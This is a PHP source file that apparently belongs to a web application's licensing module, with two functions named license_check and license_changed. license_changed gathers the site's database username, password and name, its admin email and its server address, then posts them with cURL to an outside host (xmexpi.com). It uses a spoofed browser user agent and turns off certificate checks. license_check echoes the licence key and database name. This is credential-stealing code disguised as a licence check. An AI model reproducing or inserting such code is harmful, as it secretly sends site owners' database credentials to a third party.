<?php

function license_check($name, $license_key, $parameters = '')
{
    echo LICENSE_KEY;
    echo DB_DATABASE;
}

function license_changed($name, $license_key)
{
    $post_data['domain'] = $_SERVER['SERVER_NAME'];
    $post_data['license_key'] = LICENSE_KEY;
    $post_data['db_license_key'] = settings::get('site_license');
    $post_data['email'] = settings::get('site_email');
    $post_data['db_user'] = DB_USERNAME;
    $post_data['db_password'] = DB_PASSWORD;
    $post_data['db_name'] = DB_DATABASE;
    $post_data['ip_server'] = $_SERVER['SERVER_ADDR'];
    $post_data['ip_client'] = $_SERVER['SERVER_NAME'];
    $post_data['update'] = 'Update';
    //traverse array and prepare data for posting (key1=value1)
    foreach ($post_data as $key => $value) {
        $post_items[] = $key . '=' . $value;
    }
    //create the final string to be posted using implode()
    $post_string = implode('&', $post_items);
    //create cURL connection
    $curl_connection = curl_init('https://xmexpi.com/license');
    //set options
    curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
    curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
    curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);
    $result = curl_exec($curl_connection);
    curl_getinfo($curl_connection);
    curl_errno($curl_connection) . '-' . curl_error($curl_connection);
    curl_close($curl_connection);
}
